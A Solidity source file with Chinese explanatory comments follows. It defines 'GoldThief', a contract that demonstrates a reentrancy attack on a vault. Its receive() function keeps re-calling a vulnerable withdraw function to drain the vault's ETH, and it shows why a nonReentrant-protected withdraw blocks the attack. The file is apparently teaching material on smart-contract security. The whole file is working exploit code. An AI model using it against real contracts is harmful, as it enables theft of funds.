// SPDX-License-Identifier: MIT
// 代码开源协议

pragma solidity ^0.8.19;
// 指定Solidity编译器版本

interface IVault {
// 定义金库接口
// 让攻击合约知道目标合约有哪些函数可以调用
    
    function deposit() external payable;
    // 存款函数（可接收ETH）
    
    function vulnerableWithdraw() external;
    // 脆弱取款函数（容易被攻击）
    
    function safeWithdraw() external;
    // 安全取款函数（有重入锁保护）
}

contract GoldThief {
// 定义一个合约，叫"黄金小偷"
// 这是一个恶意合约，用于演示重入攻击

    IVault public targetVault;
    // 目标金库的接口（要攻击的合约）
    
    address public owner;
    // 攻击者地址（合约所有者）
    
    uint public attackCount;
    // 攻击计数器（记录重入次数）
    
    bool public attackingSafe;
    // 是否在攻击安全版本
    // true = 攻击safeWithdraw，false = 攻击vulnerableWithdraw

    constructor(address _vaultAddress) {
    // 构造函数：部署时指定要攻击的金库地址
        
        targetVault = IVault(_vaultAddress);
        // 设置目标金库
        
        owner = msg.sender;
        // 设置攻击者为合约部署者
    }

    function attackVulnerable() external payable {
    // 函数：攻击脆弱版本的取款函数
    // external payable：外部调用，可以附带ETH
        
        require(msg.sender == owner, "Only owner");
        // 检查：只有合约所有者能调用
        
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");
        // 检查：至少需要1 ETH作为初始资金

        attackingSafe = false;
        // 标记为攻击脆弱版本
        
        attackCount = 0;
        // 重置攻击计数器

        targetVault.deposit{value: msg.value}();
        // 先存款：把ETH存入金库
        
        targetVault.vulnerableWithdraw();
        // 触发取款！这会启动重入攻击
        // 当金库发送ETH给这个合约时，会触发 receive() 函数
        // receive() 会再次调用 vulnerableWithdraw()
        // 形成重入循环
    }

    function attackSafe() external payable {
    // 函数：尝试攻击安全版本的取款函数
    // 这个攻击会失败，因为 safeWithdraw 有重入锁
        
        require(msg.sender == owner, "Only owner");
        require(msg.value >= 1 ether, "Need at least 1 ETH");

        attackingSafe = true;
        // 标记为攻击安全版本
        
        attackCount = 0;
        // 重置攻击计数器

        targetVault.deposit{value: msg.value}();
        // 先存款
        
        targetVault.safeWithdraw();
        // 尝试触发取款
        // 但 safeWithdraw 有 nonReentrant 修饰符
        // 当 receive() 尝试再次调用时会被阻止
    }

    receive() external payable {
    // receive 函数：当合约收到ETH时自动执行
    // 这是重入攻击的核心！
        
        attackCount++;
        // 每次收到ETH，攻击计数器+1
        // 可以用来追踪重入了多少次

        if (!attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5) {
        // 如果不是攻击安全版本（即攻击脆弱版本）
        // 并且金库余额还有至少1 ETH
        // 并且攻击次数小于5（防止无限循环耗尽gas）
            
            targetVault.vulnerableWithdraw();
            // 🔥 关键！再次调用脆弱取款函数
            // 这就是重入攻击：在转账过程中再次调用取款
            // 此时金库还没有更新余额（因为先转账后更新）
            // 所以每次都能取出相同的金额
        }

        if (attackingSafe) {
        // 如果是攻击安全版本
            targetVault.safeWithdraw();
            // 尝试再次调用安全取款
            // 但 safeWithdraw 有 nonReentrant 锁
            // 第一次调用后锁被占用，再次调用会失败
            // 所以这个攻击会失败，交易会回滚
        }
    }

    function stealLoot() external {
    // 函数：提取赃款
    // 攻击成功后，把所有ETH转给攻击者
        
        require(msg.sender == owner, "Only owner");
        // 检查：只有合约所有者能调用
        
        payable(owner).transfer(address(this).balance);
        // 把合约里所有ETH转给攻击者
    }

    function getBalance() external view returns (uint256) {
    // 函数：查看攻击合约的余额
        
        return address(this).balance;
        // 返回当前合约持有的ETH数量
    }
}